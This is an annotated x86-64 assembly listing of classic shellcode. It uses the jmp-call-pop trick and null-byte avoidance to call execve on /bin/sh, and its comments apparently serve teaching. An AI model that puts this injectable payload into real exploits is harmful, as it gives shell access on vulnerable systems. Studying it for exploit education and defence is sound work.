section .text 					; Declares a code section. 
	global _start 				; Declares the _start tag as the global entry point. 

		_start: 			; Entry point to the program. 
			BITS 64 		; Declares 64-bits mode. 
			jmp short two 		; Jumps to the "two" tag. 
		one:    			; Defines a label "one". 
			pop rbx		; Pops a value from the stacks and stores it in register rbx. 
			mov [rbx+8],  rbx  	; store "rbx" to memory at address "rbx + 8"
			xor al, al
			mov [rbx+7],al
			xor rax, rax		; mov rax, 0x00  rax = 0
			mov [rbx+16], rax 	; store "rax" to memory at address "rbx + 16"
			mov rdi, rbx       	; rdi = rbx 1
			lea rsi, [rbx+8]   	; rsi = rbx +8 2
			xor rdx, rdx 		; mov rdx, 0x00     	; rdx = 0. 
			mov rax, 0xFFFFFFFFFFFFFF3B        	; rax = 59.
			shl rax, 0x38
			shr rax, 0x38 
			syscall		; system call. 
		two:				; Defines a label "two". 
			call one		; Calls the code at the "one" tag. This code will execute the execve system call to execute /bin/sh.
			db "/bin/sh", 0xFF
			db "AAAAAAAA"		; Stores 8 'A' in the memory. 
			db "BBBBBBBB"		; ; Stores 8 'B' in the memory. 
